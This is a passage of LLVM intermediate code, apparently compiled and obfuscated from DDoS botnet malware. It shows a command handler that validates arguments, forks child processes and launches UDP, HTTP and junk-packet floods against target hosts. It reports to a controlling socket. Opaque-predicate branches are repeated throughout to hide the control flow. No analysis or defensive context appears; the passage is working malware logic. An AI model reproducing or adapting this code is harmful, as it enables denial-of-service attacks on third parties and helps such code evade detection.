  call void @_exit(i32 0) #12
  %450 = load i32, i32* @x.79
  %451 = load i32, i32* @y.80
  %452 = sub i32 %450, 1
  %453 = mul i32 %450, %452
  %454 = urem i32 %453, 2
  %455 = icmp eq i32 %454, 0
  %456 = icmp slt i32 %451, 10
  %457 = or i1 %455, %456
  br i1 %457, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  unreachable

; <label>:458:                                    ; preds = %433
  %459 = load i32, i32* @x.79
  %460 = load i32, i32* @y.80
  %461 = sub i32 %459, 1
  %462 = mul i32 %459, %461
  %463 = urem i32 %462, 2
  %464 = icmp eq i32 %463, 0
  %465 = icmp slt i32 %460, 10
  %466 = or i1 %464, %465
  br i1 %466, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %458
  %467 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %467, i8** %13, align 8
  %468 = load i32, i32* @x.79
  %469 = load i32, i32* @y.80
  %470 = sub i32 %468, 1
  %471 = mul i32 %468, %470
  %472 = urem i32 %471, 2
  %473 = icmp eq i32 %472, 0
  %474 = icmp slt i32 %469, 10
  %475 = or i1 %473, %474
  br i1 %475, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br label %414

; <label>:476:                                    ; preds = %originalBBpart248
  br label %524

; <label>:477:                                    ; preds = %originalBBpart244
  %478 = load i32, i32* @x.79
  %479 = load i32, i32* @y.80
  %480 = sub i32 %478, 1
  %481 = mul i32 %478, %480
  %482 = urem i32 %481, 2
  %483 = icmp eq i32 %482, 0
  %484 = icmp slt i32 %479, 10
  %485 = or i1 %483, %484
  br i1 %485, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %477
  %486 = call i32 @listFork()
  %487 = icmp ne i32 %486, 0
  %488 = load i32, i32* @x.79
  %489 = load i32, i32* @y.80
  %490 = sub i32 %488, 1
  %491 = mul i32 %488, %490
  %492 = urem i32 %491, 2
  %493 = icmp eq i32 %492, 0
  %494 = icmp slt i32 %489, 10
  %495 = or i1 %493, %494
  br i1 %495, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br i1 %487, label %496, label %513

; <label>:496:                                    ; preds = %originalBBpart260
  %497 = load i32, i32* @x.79
  %498 = load i32, i32* @y.80
  %499 = sub i32 %497, 1
  %500 = mul i32 %497, %499
  %501 = urem i32 %500, 2
  %502 = icmp eq i32 %501, 0
  %503 = icmp slt i32 %498, 10
  %504 = or i1 %502, %503
  br i1 %504, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %496
  %505 = load i32, i32* @x.79
  %506 = load i32, i32* @y.80
  %507 = sub i32 %505, 1
  %508 = mul i32 %505, %507
  %509 = urem i32 %508, 2
  %510 = icmp eq i32 %509, 0
  %511 = icmp slt i32 %506, 10
  %512 = or i1 %510, %511
  br i1 %512, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br label %1248

; <label>:513:                                    ; preds = %originalBBpart260
  %514 = load i32, i32* @mainCommSock, align 4
  %515 = load i8*, i8** %10, align 8
  %516 = load i32, i32* %11, align 4
  %517 = load i32, i32* %12, align 4
  %518 = call i32 (i32, i8*, ...) @sockprintf(i32 %514, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.60, i32 0, i32 0), i8* %515, i32 %516, i32 %517)
  %519 = load i8*, i8** %10, align 8
  %520 = load i32, i32* %11, align 4
  %521 = load i32, i32* %12, align 4
  call void @sendJUNK(i8* %519, i32 %520, i32 %521)
  %522 = load i32, i32* @mainCommSock, align 4
  %523 = call i32 @close(i32 %522)
  call void @_exit(i32 0) #12
  unreachable

; <label>:524:                                    ; preds = %476
  br label %525

; <label>:525:                                    ; preds = %524, %353
  %526 = load i8**, i8*** %4, align 8
  %527 = getelementptr inbounds i8*, i8** %526, i64 0
  %528 = load i8*, i8** %527, align 8
  %529 = call i32 @strcmp(i8* %528, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.61, i32 0, i32 0)) #10
  %530 = icmp ne i32 %529, 0
  br i1 %530, label %753, label %531

; <label>:531:                                    ; preds = %525
  %532 = load i32, i32* %3, align 4
  %533 = icmp slt i32 %532, 6
  br i1 %533, label %611, label %534

; <label>:534:                                    ; preds = %531
  %535 = load i32, i32* @x.79
  %536 = load i32, i32* @y.80
  %537 = sub i32 %535, 1
  %538 = mul i32 %535, %537
  %539 = urem i32 %538, 2
  %540 = icmp eq i32 %539, 0
  %541 = icmp slt i32 %536, 10
  %542 = or i1 %540, %541
  br i1 %542, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %534
  %543 = load i8**, i8*** %4, align 8
  %544 = getelementptr inbounds i8*, i8** %543, i64 3
  %545 = load i8*, i8** %544, align 8
  %546 = call i32 @atoi(i8* %545) #10
  %547 = icmp eq i32 %546, -1
  %548 = load i32, i32* @x.79
  %549 = load i32, i32* @y.80
  %550 = sub i32 %548, 1
  %551 = mul i32 %548, %550
  %552 = urem i32 %551, 2
  %553 = icmp eq i32 %552, 0
  %554 = icmp slt i32 %549, 10
  %555 = or i1 %553, %554
  br i1 %555, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br i1 %547, label %611, label %556

; <label>:556:                                    ; preds = %originalBBpart268
  %557 = load i8**, i8*** %4, align 8
  %558 = getelementptr inbounds i8*, i8** %557, i64 2
  %559 = load i8*, i8** %558, align 8
  %560 = call i32 @atoi(i8* %559) #10
  %561 = icmp eq i32 %560, -1
  br i1 %561, label %611, label %562

; <label>:562:                                    ; preds = %556
  %563 = load i32, i32* @x.79
  %564 = load i32, i32* @y.80
  %565 = sub i32 %563, 1
  %566 = mul i32 %563, %565
  %567 = urem i32 %566, 2
  %568 = icmp eq i32 %567, 0
  %569 = icmp slt i32 %564, 10
  %570 = or i1 %568, %569
  br i1 %570, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %562
  %571 = load i8**, i8*** %4, align 8
  %572 = getelementptr inbounds i8*, i8** %571, i64 4
  %573 = load i8*, i8** %572, align 8
  %574 = call i32 @atoi(i8* %573) #10
  %575 = icmp eq i32 %574, -1
  %576 = load i32, i32* @x.79
  %577 = load i32, i32* @y.80
  %578 = sub i32 %576, 1
  %579 = mul i32 %576, %578
  %580 = urem i32 %579, 2
  %581 = icmp eq i32 %580, 0
  %582 = icmp slt i32 %577, 10
  %583 = or i1 %581, %582
  br i1 %583, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br i1 %575, label %611, label %584

; <label>:584:                                    ; preds = %originalBBpart272
  %585 = load i8**, i8*** %4, align 8
  %586 = getelementptr inbounds i8*, i8** %585, i64 5
  %587 = load i8*, i8** %586, align 8
  %588 = call i32 @atoi(i8* %587) #10
  %589 = icmp eq i32 %588, -1
  br i1 %589, label %611, label %590

; <label>:590:                                    ; preds = %584
  %591 = load i8**, i8*** %4, align 8
  %592 = getelementptr inbounds i8*, i8** %591, i64 5
  %593 = load i8*, i8** %592, align 8
  %594 = call i32 @atoi(i8* %593) #10
  %595 = icmp sgt i32 %594, 65500
  br i1 %595, label %611, label %596

; <label>:596:                                    ; preds = %590
  %597 = load i8**, i8*** %4, align 8
  %598 = getelementptr inbounds i8*, i8** %597, i64 4
  %599 = load i8*, i8** %598, align 8
  %600 = call i32 @atoi(i8* %599) #10
  %601 = icmp sgt i32 %600, 32
  br i1 %601, label %611, label %602

; <label>:602:                                    ; preds = %596
  %603 = load i32, i32* %3, align 4
  %604 = icmp eq i32 %603, 7
  br i1 %604, label %605, label %612

; <label>:605:                                    ; preds = %602
  %606 = load i8**, i8*** %4, align 8
  %607 = getelementptr inbounds i8*, i8** %606, i64 6
  %608 = load i8*, i8** %607, align 8
  %609 = call i32 @atoi(i8* %608) #10
  %610 = icmp slt i32 %609, 1
  br i1 %610, label %611, label %612

; <label>:611:                                    ; preds = %605, %596, %590, %584, %originalBBpart272, %556, %originalBBpart268, %531
  br label %1248

; <label>:612:                                    ; preds = %605, %602
  %613 = load i8**, i8*** %4, align 8
  %614 = getelementptr inbounds i8*, i8** %613, i64 1
  %615 = load i8*, i8** %614, align 8
  store i8* %615, i8** %14, align 8
  %616 = load i8**, i8*** %4, align 8
  %617 = getelementptr inbounds i8*, i8** %616, i64 2
  %618 = load i8*, i8** %617, align 8
  %619 = call i32 @atoi(i8* %618) #10
  store i32 %619, i32* %15, align 4
  %620 = load i8**, i8*** %4, align 8
  %621 = getelementptr inbounds i8*, i8** %620, i64 3
  %622 = load i8*, i8** %621, align 8
  %623 = call i32 @atoi(i8* %622) #10
  store i32 %623, i32* %16, align 4
  %624 = load i8**, i8*** %4, align 8
  %625 = getelementptr inbounds i8*, i8** %624, i64 4
  %626 = load i8*, i8** %625, align 8
  %627 = call i32 @atoi(i8* %626) #10
  store i32 %627, i32* %17, align 4
  %628 = load i8**, i8*** %4, align 8
  %629 = getelementptr inbounds i8*, i8** %628, i64 5
  %630 = load i8*, i8** %629, align 8
  %631 = call i32 @atoi(i8* %630) #10
  store i32 %631, i32* %18, align 4
  %632 = load i32, i32* %3, align 4
  %633 = icmp eq i32 %632, 7
  br i1 %633, label %634, label %655

; <label>:634:                                    ; preds = %612
  %635 = load i32, i32* @x.79
  %636 = load i32, i32* @y.80
  %637 = sub i32 %635, 1
  %638 = mul i32 %635, %637
  %639 = urem i32 %638, 2
  %640 = icmp eq i32 %639, 0
  %641 = icmp slt i32 %636, 10
  %642 = or i1 %640, %641
  br i1 %642, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %634
  %643 = load i8**, i8*** %4, align 8
  %644 = getelementptr inbounds i8*, i8** %643, i64 6
  %645 = load i8*, i8** %644, align 8
  %646 = call i32 @atoi(i8* %645) #10
  %647 = load i32, i32* @x.79
  %648 = load i32, i32* @y.80
  %649 = sub i32 %647, 1
  %650 = mul i32 %647, %649
  %651 = urem i32 %650, 2
  %652 = icmp eq i32 %651, 0
  %653 = icmp slt i32 %648, 10
  %654 = or i1 %652, %653
  br i1 %654, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br label %656

; <label>:655:                                    ; preds = %612
  br label %656

; <label>:656:                                    ; preds = %655, %originalBBpart276
  %657 = phi i32 [ %646, %originalBBpart276 ], [ 10, %655 ]
  store i32 %657, i32* %19, align 4
  %658 = load i8*, i8** %14, align 8
  %659 = call i8* @strstr(i8* %658, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #10
  %660 = icmp ne i8* %659, null
  br i1 %660, label %661, label %718

; <label>:661:                                    ; preds = %656
  %662 = load i32, i32* @mainCommSock, align 4
  %663 = load i8*, i8** %14, align 8
  %664 = load i32, i32* %16, align 4
  %665 = call i32 (i32, i8*, ...) @sockprintf(i32 %662, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.62, i32 0, i32 0), i8* %663, i32 %664)
  %666 = load i8*, i8** %14, align 8
  %667 = call i8* @strtok(i8* %666, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %667, i8** %20, align 8
  br label %668

; <label>:668:                                    ; preds = %715, %661
  %669 = load i8*, i8** %20, align 8
  %670 = icmp ne i8* %669, null
  br i1 %670, label %671, label %717

; <label>:671:                                    ; preds = %668
  %672 = load i32, i32* @x.79
  %673 = load i32, i32* @y.80
  %674 = sub i32 %672, 1
  %675 = mul i32 %672, %674
  %676 = urem i32 %675, 2
  %677 = icmp eq i32 %676, 0
  %678 = icmp slt i32 %673, 10
  %679 = or i1 %677, %678
  br i1 %679, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %671
  %680 = call i32 @listFork()
  %681 = icmp ne i32 %680, 0
  %682 = load i32, i32* @x.79
  %683 = load i32, i32* @y.80
  %684 = sub i32 %682, 1
  %685 = mul i32 %682, %684
  %686 = urem i32 %685, 2
  %687 = icmp eq i32 %686, 0
  %688 = icmp slt i32 %683, 10
  %689 = or i1 %687, %688
  br i1 %689, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br i1 %681, label %715, label %690

; <label>:690:                                    ; preds = %originalBBpart280
  %691 = load i32, i32* @x.79
  %692 = load i32, i32* @y.80
  %693 = sub i32 %691, 1
  %694 = mul i32 %691, %693
  %695 = urem i32 %694, 2
  %696 = icmp eq i32 %695, 0
  %697 = icmp slt i32 %692, 10
  %698 = or i1 %696, %697
  br i1 %698, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %690
  %699 = load i8*, i8** %20, align 8
  %700 = load i32, i32* %15, align 4
  %701 = load i32, i32* %16, align 4
  %702 = load i32, i32* %17, align 4
  %703 = load i32, i32* %18, align 4
  %704 = load i32, i32* %19, align 4
  call void @sendUDP(i8* %699, i32 %700, i32 %701, i32 %702, i32 %703, i32 %704)
  %705 = load i32, i32* @mainCommSock, align 4
  %706 = call i32 @close(i32 %705)
  call void @_exit(i32 0) #12
  %707 = load i32, i32* @x.79
  %708 = load i32, i32* @y.80
  %709 = sub i32 %707, 1
  %710 = mul i32 %707, %709
  %711 = urem i32 %710, 2
  %712 = icmp eq i32 %711, 0
  %713 = icmp slt i32 %708, 10
  %714 = or i1 %712, %713
  br i1 %714, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  unreachable

; <label>:715:                                    ; preds = %originalBBpart280
  %716 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %716, i8** %20, align 8
  br label %668

; <label>:717:                                    ; preds = %668
  br label %752

; <label>:718:                                    ; preds = %656
  %719 = load i32, i32* @x.79
  %720 = load i32, i32* @y.80
  %721 = sub i32 %719, 1
  %722 = mul i32 %719, %721
  %723 = urem i32 %722, 2
  %724 = icmp eq i32 %723, 0
  %725 = icmp slt i32 %720, 10
  %726 = or i1 %724, %725
  br i1 %726, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %718
  %727 = call i32 @listFork()
  %728 = icmp ne i32 %727, 0
  %729 = load i32, i32* @x.79
  %730 = load i32, i32* @y.80
  %731 = sub i32 %729, 1
  %732 = mul i32 %729, %731
  %733 = urem i32 %732, 2
  %734 = icmp eq i32 %733, 0
  %735 = icmp slt i32 %730, 10
  %736 = or i1 %734, %735
  br i1 %736, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br i1 %728, label %737, label %738

; <label>:737:                                    ; preds = %originalBBpart288
  br label %1248

; <label>:738:                                    ; preds = %originalBBpart288
  %739 = load i32, i32* @mainCommSock, align 4
  %740 = load i8*, i8** %14, align 8
  %741 = load i32, i32* %15, align 4
  %742 = load i32, i32* %16, align 4
  %743 = call i32 (i32, i8*, ...) @sockprintf(i32 %739, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.63, i32 0, i32 0), i8* %740, i32 %741, i32 %742)
  %744 = load i8*, i8** %14, align 8
  %745 = load i32, i32* %15, align 4
  %746 = load i32, i32* %16, align 4
  %747 = load i32, i32* %17, align 4
  %748 = load i32, i32* %18, align 4
  %749 = load i32, i32* %19, align 4
  call void @sendUDP(i8* %744, i32 %745, i32 %746, i32 %747, i32 %748, i32 %749)
  %750 = load i32, i32* @mainCommSock, align 4
  %751 = call i32 @close(i32 %750)
  call void @_exit(i32 0) #12
  unreachable

; <label>:752:                                    ; preds = %717
  br label %753

; <label>:753:                                    ; preds = %752, %525
  %754 = load i32, i32* @x.79
  %755 = load i32, i32* @y.80
  %756 = sub i32 %754, 1
  %757 = mul i32 %754, %756
  %758 = urem i32 %757, 2
  %759 = icmp eq i32 %758, 0
  %760 = icmp slt i32 %755, 10
  %761 = or i1 %759, %760
  br i1 %761, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %753
  %762 = load i8**, i8*** %4, align 8
  %763 = getelementptr inbounds i8*, i8** %762, i64 0
  %764 = load i8*, i8** %763, align 8
  %765 = call i32 @strcmp(i8* %764, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.64, i32 0, i32 0)) #10
  %766 = icmp ne i32 %765, 0
  %767 = load i32, i32* @x.79
  %768 = load i32, i32* @y.80
  %769 = sub i32 %767, 1
  %770 = mul i32 %767, %769
  %771 = urem i32 %770, 2
  %772 = icmp eq i32 %771, 0
  %773 = icmp slt i32 %768, 10
  %774 = or i1 %772, %773
  br i1 %774, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br i1 %766, label %879, label %775

; <label>:775:                                    ; preds = %originalBBpart292
  %776 = load i32, i32* %3, align 4
  %777 = icmp slt i32 %776, 3
  br i1 %777, label %784, label %778

; <label>:778:                                    ; preds = %775
  %779 = load i8**, i8*** %4, align 8
  %780 = getelementptr inbounds i8*, i8** %779, i64 2
  %781 = load i8*, i8** %780, align 8
  %782 = call i32 @atoi(i8* %781) #10
  %783 = icmp slt i32 %782, 1
  br i1 %783, label %784, label %785

; <label>:784:                                    ; preds = %778, %775
  br label %1248

; <label>:785:                                    ; preds = %778
  %786 = load i8**, i8*** %4, align 8
  %787 = getelementptr inbounds i8*, i8** %786, i64 1
  %788 = load i8*, i8** %787, align 8
  store i8* %788, i8** %21, align 8
  %789 = load i8**, i8*** %4, align 8
  %790 = getelementptr inbounds i8*, i8** %789, i64 2
  %791 = load i8*, i8** %790, align 8
  %792 = call i32 @atoi(i8* %791) #10
  store i32 %792, i32* %22, align 4
  %793 = load i8*, i8** %21, align 8
  %794 = call i8* @strstr(i8* %793, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #10
  %795 = icmp ne i8* %794, null
  br i1 %795, label %796, label %833

; <label>:796:                                    ; preds = %785
  %797 = load i32, i32* @x.79
  %798 = load i32, i32* @y.80
  %799 = sub i32 %797, 1
  %800 = mul i32 %797, %799
  %801 = urem i32 %800, 2
  %802 = icmp eq i32 %801, 0
  %803 = icmp slt i32 %798, 10
  %804 = or i1 %802, %803
  br i1 %804, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %796
  %805 = load i32, i32* @mainCommSock, align 4
  %806 = load i8*, i8** %21, align 8
  %807 = load i32, i32* %22, align 4
  %808 = call i32 (i32, i8*, ...) @sockprintf(i32 %805, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.65, i32 0, i32 0), i8* %806, i32 %807)
  %809 = load i8*, i8** %21, align 8
  %810 = call i8* @strtok(i8* %809, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %810, i8** %23, align 8
  %811 = load i32, i32* @x.79
  %812 = load i32, i32* @y.80
  %813 = sub i32 %811, 1
  %814 = mul i32 %811, %813
  %815 = urem i32 %814, 2
  %816 = icmp eq i32 %815, 0
  %817 = icmp slt i32 %812, 10
  %818 = or i1 %816, %817
  br i1 %818, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br label %819

; <label>:819:                                    ; preds = %830, %originalBBpart296
  %820 = load i8*, i8** %23, align 8
  %821 = icmp ne i8* %820, null
  br i1 %821, label %822, label %832

; <label>:822:                                    ; preds = %819
  %823 = call i32 @listFork()
  %824 = icmp ne i32 %823, 0
  br i1 %824, label %830, label %825

; <label>:825:                                    ; preds = %822
  %826 = load i8*, i8** %21, align 8
  %827 = load i32, i32* %22, align 4
  call void @sendHTTP(i8* %826, i32 %827)
  %828 = load i32, i32* @mainCommSock, align 4
  %829 = call i32 @close(i32 %828)
  call void @_exit(i32 0) #12
  unreachable

; <label>:830:                                    ; preds = %822
  %831 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %831, i8** %23, align 8
  br label %819

; <label>:832:                                    ; preds = %819
  br label %878

; <label>:833:                                    ; preds = %785
  %834 = load i32, i32* @x.79
  %835 = load i32, i32* @y.80
  %836 = sub i32 %834, 1
  %837 = mul i32 %834, %836
  %838 = urem i32 %837, 2
  %839 = icmp eq i32 %838, 0
  %840 = icmp slt i32 %835, 10
  %841 = or i1 %839, %840
  br i1 %841, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %833
  %842 = call i32 @listFork()
  %843 = icmp ne i32 %842, 0
  %844 = load i32, i32* @x.79
  %845 = load i32, i32* @y.80
  %846 = sub i32 %844, 1
  %847 = mul i32 %844, %846
  %848 = urem i32 %847, 2
  %849 = icmp eq i32 %848, 0
  %850 = icmp slt i32 %845, 10
  %851 = or i1 %849, %850
  br i1 %851, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br i1 %843, label %852, label %853

; <label>:852:                                    ; preds = %originalBBpart2100
  br label %1248

; <label>:853:                                    ; preds = %originalBBpart2100
  %854 = load i32, i32* @x.79
  %855 = load i32, i32* @y.80
  %856 = sub i32 %854, 1
  %857 = mul i32 %854, %856
  %858 = urem i32 %857, 2
  %859 = icmp eq i32 %858, 0
  %860 = icmp slt i32 %855, 10
  %861 = or i1 %859, %860
  br i1 %861, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %853
  %862 = load i32, i32* @mainCommSock, align 4
  %863 = load i8*, i8** %21, align 8
  %864 = load i32, i32* %22, align 4
  %865 = call i32 (i32, i8*, ...) @sockprintf(i32 %862, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.65, i32 0, i32 0), i8* %863, i32 %864)
  %866 = load i8*, i8** %21, align 8
  %867 = load i32, i32* %22, align 4
  call void @sendHTTP(i8* %866, i32 %867)
  %868 = load i32, i32* @mainCommSock, align 4
  %869 = call i32 @close(i32 %868)
  call void @_exit(i32 0) #12
  %870 = load i32, i32* @x.79
  %871 = load i32, i32* @y.80
  %872 = sub i32 %870, 1
  %873 = mul i32 %870, %872
  %874 = urem i32 %873, 2
  %875 = icmp eq i32 %874, 0
  %876 = icmp slt i32 %871, 10
  %877 = or i1 %875, %876
  br i1 %877, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  unreachable

; <label>:878:                                    ; preds = %832
  br label %879

; <label>:879:                                    ; preds = %878, %originalBBpart292
  %880 = load i32, i32* @x.79
  %881 = load i32, i32* @y.80
  %882 = sub i32 %880, 1
  %883 = mul i32 %880, %882
  %884 = urem i32 %883, 2
  %885 = icmp eq i32 %884, 0
  %886 = icmp slt i32 %881, 10
  %887 = or i1 %885, %886
  br i1 %887, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %879
  %888 = load i8**, i8*** %4, align 8
  %889 = getelementptr inbounds i8*, i8** %888, i64 0
  %890 = load i8*, i8** %889, align 8
  %891 = call i32 @strcmp(i8* %890, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.66, i32 0, i32 0)) #10
  %892 = icmp ne i32 %891, 0
  %893 = load i32, i32* @x.79
  %894 = load i32, i32* @y.80
  %895 = sub i32 %893, 1
  %896 = mul i32 %893, %895
  %897 = urem i32 %896, 2
  %898 = icmp eq i32 %897, 0
  %899 = icmp slt i32 %894, 10
  %900 = or i1 %898, %899
  br i1 %900, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  br i1 %892, label %1162, label %901

; <label>:901:                                    ; preds = %originalBBpart2108
  %902 = load i32, i32* @x.79
  %903 = load i32, i32* @y.80
  %904 = sub i32 %902, 1
  %905 = mul i32 %902, %904
  %906 = urem i32 %905, 2
  %907 = icmp eq i32 %906, 0
  %908 = icmp slt i32 %903, 10
  %909 = or i1 %907, %908
  br i1 %909, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %901
  %910 = load i32, i32* %3, align 4
  %911 = icmp slt i32 %910, 6
  %912 = load i32, i32* @x.79
  %913 = load i32, i32* @y.80
  %914 = sub i32 %912, 1
  %915 = mul i32 %912, %914
  %916 = urem i32 %915, 2
  %917 = icmp eq i32 %916, 0
  %918 = icmp slt i32 %913, 10
  %919 = or i1 %917, %918
  br i1 %919, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  br i1 %911, label %994, label %920

; <label>:920:                                    ; preds = %originalBBpart2112
  %921 = load i8**, i8*** %4, align 8
  %922 = getelementptr inbounds i8*, i8** %921, i64 3
  %923 = load i8*, i8** %922, align 8
  %924 = call i32 @atoi(i8* %923) #10
  %925 = icmp eq i32 %924, -1
  br i1 %925, label %994, label %926

; <label>:926:                                    ; preds = %920
  %927 = load i32, i32* @x.79
  %928 = load i32, i32* @y.80
  %929 = sub i32 %927, 1
  %930 = mul i32 %927, %929
  %931 = urem i32 %930, 2
  %932 = icmp eq i32 %931, 0
  %933 = icmp slt i32 %928, 10
  %934 = or i1 %932, %933
  br i1 %934, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %926
  %935 = load i8**, i8*** %4, align 8
  %936 = getelementptr inbounds i8*, i8** %935, i64 2
  %937 = load i8*, i8** %936, align 8
  %938 = call i32 @atoi(i8* %937) #10
  %939 = icmp eq i32 %938, -1
  %940 = load i32, i32* @x.79
  %941 = load i32, i32* @y.80
  %942 = sub i32 %940, 1
  %943 = mul i32 %940, %942
  %944 = urem i32 %943, 2
  %945 = icmp eq i32 %944, 0
  %946 = icmp slt i32 %941, 10
  %947 = or i1 %945, %946
  br i1 %947, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  br i1 %939, label %994, label %948

; <label>:948:                                    ; preds = %originalBBpart2116
  %949 = load i8**, i8*** %4, align 8
  %950 = getelementptr inbounds i8*, i8** %949, i64 4
  %951 = load i8*, i8** %950, align 8
  %952 = call i32 @atoi(i8* %951) #10
  %953 = icmp eq i32 %952, -1
  br i1 %953, label %994, label %954

; <label>:954:                                    ; preds = %948
  %955 = load i8**, i8*** %4, align 8
  %956 = getelementptr inbounds i8*, i8** %955, i64 4
  %957 = load i8*, i8** %956, align 8
  %958 = call i32 @atoi(i8* %957) #10
  %959 = icmp sgt i32 %958, 32
  br i1 %959, label %994, label %960

; <label>:960:                                    ; preds = %954
  %961 = load i32, i32* %3, align 4
  %962 = icmp sgt i32 %961, 6
  br i1 %962, label %963, label %969

; <label>:963:                                    ; preds = %960
  %964 = load i8**, i8*** %4, align 8
  %965 = getelementptr inbounds i8*, i8** %964, i64 6
  %966 = load i8*, i8** %965, align 8
  %967 = call i32 @atoi(i8* %966) #10
  %968 = icmp slt i32 %967, 0
  br i1 %968, label %994, label %969

; <label>:969:                                    ; preds = %963, %960
  %970 = load i32, i32* @x.79
  %971 = load i32, i32* @y.80
  %972 = sub i32 %970, 1
  %973 = mul i32 %970, %972
  %974 = urem i32 %973, 2
  %975 = icmp eq i32 %974, 0
  %976 = icmp slt i32 %971, 10
  %977 = or i1 %975, %976
  br i1 %977, label %originalBB118, label %originalBB118alteredBB

originalBB118:                                    ; preds = %originalBB118alteredBB, %969
  %978 = load i32, i32* %3, align 4
  %979 = icmp eq i32 %978, 8
  %980 = load i32, i32* @x.79
  %981 = load i32, i32* @y.80
  %982 = sub i32 %980, 1
  %983 = mul i32 %980, %982
  %984 = urem i32 %983, 2
  %985 = icmp eq i32 %984, 0
  %986 = icmp slt i32 %981, 10
  %987 = or i1 %985, %986
  br i1 %987, label %originalBBpart2120, label %originalBB118alteredBB

originalBBpart2120:                               ; preds = %originalBB118
  br i1 %979, label %988, label %995

; <label>:988:                                    ; preds = %originalBBpart2120
  %989 = load i8**, i8*** %4, align 8
  %990 = getelementptr inbounds i8*, i8** %989, i64 7
  %991 = load i8*, i8** %990, align 8
  %992 = call i32 @atoi(i8* %991) #10
  %993 = icmp slt i32 %992, 1
  br i1 %993, label %994, label %995

; <label>:994:                                    ; preds = %988, %963, %954, %948, %originalBBpart2116, %920, %originalBBpart2112
  br label %1248

; <label>:995:                                    ; preds = %988, %originalBBpart2120
  %996 = load i8**, i8*** %4, align 8
  %997 = getelementptr inbounds i8*, i8** %996, i64 1
  %998 = load i8*, i8** %997, align 8
  store i8* %998, i8** %24, align 8
  %999 = load i8**, i8*** %4, align 8
  %1000 = getelementptr inbounds i8*, i8** %999, i64 2
  %1001 = load i8*, i8** %1000, align 8
  %1002 = call i32 @atoi(i8* %1001) #10
  store i32 %1002, i32* %25, align 4
  %1003 = load i8**, i8*** %4, align 8
  %1004 = getelementptr inbounds i8*, i8** %1003, i64 3
  %1005 = load i8*, i8** %1004, align 8
  %1006 = call i32 @atoi(i8* %1005) #10
  store i32 %1006, i32* %26, align 4
  %1007 = load i8**, i8*** %4, align 8
  %1008 = getelementptr inbounds i8*, i8** %1007, i64 4
  %1009 = load i8*, i8** %1008, align 8
  %1010 = call i32 @atoi(i8* %1009) #10
  store i32 %1010, i32* %27, align 4
  %1011 = load i8**, i8*** %4, align 8
  %1012 = getelementptr inbounds i8*, i8** %1011, i64 5
  %1013 = load i8*, i8** %1012, align 8
  store i8* %1013, i8** %28, align 8
  %1014 = load i32, i32* %3, align 4
  %1015 = icmp eq i32 %1014, 8
